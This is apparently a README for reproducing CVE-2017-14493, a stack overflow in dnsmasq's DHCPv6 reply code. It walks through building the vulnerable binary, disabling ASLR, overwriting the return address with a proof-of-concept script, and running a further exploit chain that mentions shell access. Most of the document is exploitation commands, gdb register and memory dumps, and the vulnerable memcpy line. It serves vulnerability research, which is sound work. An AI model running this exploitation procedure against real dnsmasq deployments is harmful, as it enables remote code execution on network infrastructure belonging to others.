# dnsmasq CVE-2017-14493

The following description can be used to build the vulnerable dnsmasq binary and reproduce the stack buffer overflow by overwriting the return address by `0x1337DEADBEEF`.

Tested in Ubuntu 18.04 vm.
### Build the binary using docker

The create the docker container and get the binary, execute:

`./build.sh && ./create_n_copy.sh`

If built correctly, `dnsmasq` folder containing the dnsmasq binary will appear in the current working directory.

### Run dnsmasq and trigger the overflow

First, disable aslr

```
sudo sysctl kernel.randomize_va_space=0
```

Next start gdb be able to debug dnsmasq

```
cd dnsmasq
sudo gdb dnsmasq
```

In gdb then set the following parameters:

```
(gdb) set args --no-daemon --dhcp-range=fd00::2,fd00::ff
```

Start execution in gdb:

```
(gdb) r
Starting program: /usr/local/sbin/dnsmasq --no-daemon --dhcp-range=fd00::2,fd00::ff
dnsmasq: started, version 2.77 cachesize 150
...
...
```

Note: In case port 53 is already in use, simply execute `sudo systemctl stop systemd-resolved`

Then use the python script to trigger the overflow

```
$ python2 poc.py ::1 547
[+] sending 128 bytes to ::1:547
```

gdb will output the following:

```
Program received signal SIGSEGV, Segmentation fault.
0x00001337deadbeef in ?? ()
...
```

### gdb output before rip overwrite

```
(gdb) b *0x555555587dfb
Breakpoint 2 at 0x555555587dfb: file rfc3315.c, line 108.
(gdb) c
Continuing.

Breakpoint 2, 0x0000555555587dfb in dhcp6_reply (context=<optimized out>, interface=<optimized out>, iface_name=<optimized out>, 
    fallback=<optimized out>, ll_addr=<optimized out>, ula_addr=<optimized out>, sz=128, client_addr=0x7fffffffe148, 
    now=1613494794) at rfc3315.c:108
108    }
(gdb) x/10wx $rsp
0x7fffffffe0e8:    0xdeadbeef    0x00001337    0x00000080    0x00000000
0x7fffffffe0f8:    0xffffe148    0x00007fff    0x602bfa0a    0x00000000
0x7fffffffe108:    0x55582dce    0x00005555
(gdb) info reg
rax            0x223    547
rbx            0x4141414141414141    4702111234474983745
rcx            0x0    0
rdx            0x5a    90
rsi            0x26    38
rdi            0x22    34
rbp            0x4141414141414141    0x4141414141414141
rsp            0x7fffffffe0e8    0x7fffffffe0e8
r8             0x7fffffffe0e0    140737488347360
r9             0x0    0
r10            0x5555557a5b96    93824994663318
r11            0x7ffff7b9ee60    140737349545568
r12            0x4141414141414141    4702111234474983745
r13            0x4141414141414141    4702111234474983745
r14            0x4141414141414141    4702111234474983745
r15            0x4141414141414141    4702111234474983745
rip            0x555555587dfb    0x555555587dfb <dhcp6_reply+283>
eflags         0x206    [ PF IF ]
cs             0x33    51
ss             0x2b    43
ds             0x0    0
es             0x0    0
fs             0x0    0
gs             0x0    0
(gdb) x/8bx $rsp
0x7fffffffe0e8:    0xef    0xbe    0xad    0xde    0x37    0x13    0x00    0x00
```

Memory layout:

```
(gdb) info proc map
process 7121
Mapped address spaces:

          Start Addr           End Addr       Size     Offset objfile
      0x555555554000     0x55555559f000    0x4b000        0x0 /usr/local/sbin/dnsmasq
      0x55555579e000     0x5555557a1000     0x3000    0x4a000 /usr/local/sbin/dnsmasq
      0x5555557a1000     0x5555557a3000     0x2000    0x4d000 /usr/local/sbin/dnsmasq
      0x5555557a3000     0x5555557c4000    0x21000        0x0 [heap]
      0x7ffff71a0000     0x7ffff71ab000     0xb000        0x0 /lib/x86_64-linux-gnu/libnss_files-2.27.so
      0x7ffff71ab000     0x7ffff73aa000   0x1ff000     0xb000 /lib/x86_64-linux-gnu/libnss_files-2.27.so
      0x7ffff73aa000     0x7ffff73ab000     0x1000     0xa000 /lib/x86_64-linux-gnu/libnss_files-2.27.so
      0x7ffff73ab000     0x7ffff73ac000     0x1000     0xb000 /lib/x86_64-linux-gnu/libnss_files-2.27.so
      0x7ffff73ac000     0x7ffff73b2000     0x6000        0x0 
      0x7ffff73b2000     0x7ffff73c9000    0x17000        0x0 /lib/x86_64-linux-gnu/libnsl-2.27.so
      0x7ffff73c9000     0x7ffff75c8000   0x1ff000    0x17000 /lib/x86_64-linux-gnu/libnsl-2.27.so
      0x7ffff75c8000     0x7ffff75c9000     0x1000    0x16000 /lib/x86_64-linux-gnu/libnsl-2.27.so
      0x7ffff75c9000     0x7ffff75ca000     0x1000    0x17000 /lib/x86_64-linux-gnu/libnsl-2.27.so
      0x7ffff75ca000     0x7ffff75cc000     0x2000        0x0 
      0x7ffff75cc000     0x7ffff75d7000     0xb000        0x0 /lib/x86_64-linux-gnu/libnss_nis-2.27.so
      0x7ffff75d7000     0x7ffff77d6000   0x1ff000     0xb000 /lib/x86_64-linux-gnu/libnss_nis-2.27.so
      0x7ffff77d6000     0x7ffff77d7000     0x1000     0xa000 /lib/x86_64-linux-gnu/libnss_nis-2.27.so
      0x7ffff77d7000     0x7ffff77d8000     0x1000     0xb000 /lib/x86_64-linux-gnu/libnss_nis-2.27.so
      0x7ffff77d8000     0x7ffff77e0000     0x8000        0x0 /lib/x86_64-linux-gnu/libnss_compat-2.27.so
      0x7ffff77e0000     0x7ffff79e0000   0x200000     0x8000 /lib/x86_64-linux-gnu/libnss_compat-2.27.so
      0x7ffff79e0000     0x7ffff79e1000     0x1000     0x8000 /lib/x86_64-linux-gnu/libnss_compat-2.27.so
      0x7ffff79e1000     0x7ffff79e2000     0x1000     0x9000 /lib/x86_64-linux-gnu/libnss_compat-2.27.so
      0x7ffff79e2000     0x7ffff7bc9000   0x1e7000        0x0 /lib/x86_64-linux-gnu/libc-2.27.so
      0x7ffff7bc9000     0x7ffff7dc9000   0x200000   0x1e7000 /lib/x86_64-linux-gnu/libc-2.27.so
      0x7ffff7dc9000     0x7ffff7dcd000     0x4000   0x1e7000 /lib/x86_64-linux-gnu/libc-2.27.so
      0x7ffff7dcd000     0x7ffff7dcf000     0x2000   0x1eb000 /lib/x86_64-linux-gnu/libc-2.27.so
      0x7ffff7dcf000     0x7ffff7dd3000     0x4000        0x0 
      0x7ffff7dd3000     0x7ffff7dfc000    0x29000        0x0 /lib/x86_64-linux-gnu/ld-2.27.so
      0x7ffff7fe2000     0x7ffff7fe4000     0x2000        0x0 
      0x7ffff7ff7000     0x7ffff7ffa000     0x3000        0x0 [vvar]
      0x7ffff7ffa000     0x7ffff7ffc000     0x2000        0x0 [vdso]
      0x7ffff7ffc000     0x7ffff7ffd000     0x1000    0x29000 /lib/x86_64-linux-gnu/ld-2.27.so
      0x7ffff7ffd000     0x7ffff7ffe000     0x1000    0x2a000 /lib/x86_64-linux-gnu/ld-2.27.so
      0x7ffff7ffe000     0x7ffff7fff000     0x1000        0x0 
      0x7ffffffde000     0x7ffffffff000    0x21000        0x0 [stack]
  0xffffffffff600000 0xffffffffff601000     0x1000        0x0 [vsyscall]
```

## Vulnerability:

in file `src/rfc3315.c:206`:

```
  /* RFC-6939 */
  if ((opt = opt6_find(opts, end, OPTION6_CLIENT_MAC, 3)))
    {
      state->mac_type = opt6_uint(opt, 0, 2);
      state->mac_len = opt6_len(opt) - 2;
      memcpy(&state->mac[0], opt6_ptr(opt, 2), state->mac_len);
    }
```

## Bug Testing / Verify chain generated by tool:

### Setup:

Ubuntu 18.04 vm:

Disable ASLR and enable coredumps:
```
sudo sysctl kernel.randomize_va_space=0
ulimit -c unlimited     # make sure to issue this command in the same shell where dnsmasq_binary will be executed
sudo sysctl -w kernel.core_pattern=/tmp/core.%u.%p.%t
```

For gdb:
```
user@user-VirtualBox:~/targets$ cat ~/.gdbinit
set disassembly-flavor intel
unset env LINES
unset env COLUMNS
``` 

Start gdb via
```
sudo gdb ./dnsmasq_binary
```

In gdb (optionally set breakpoint (this will prevent from shell interaction though: `b *0x555555587dfb`)): 
```
set args --no-daemon --dhcp-range=fd00::2,fd00::ff
r
``` 

Start poc with payload:
```
python2.7 poc_chain.py ::1 547 stack.bin
```

### Outside of GDB:

(`rsp` is slightly of by 0x30 due to some env stuff)

```
sudo ./dnsmasq_binary --no-daemon --dhcp-range=fd00::2,fd00::ff
```

in another terminal:

```
python2.7 poc_chain.py ::1 547 stack.bin
```

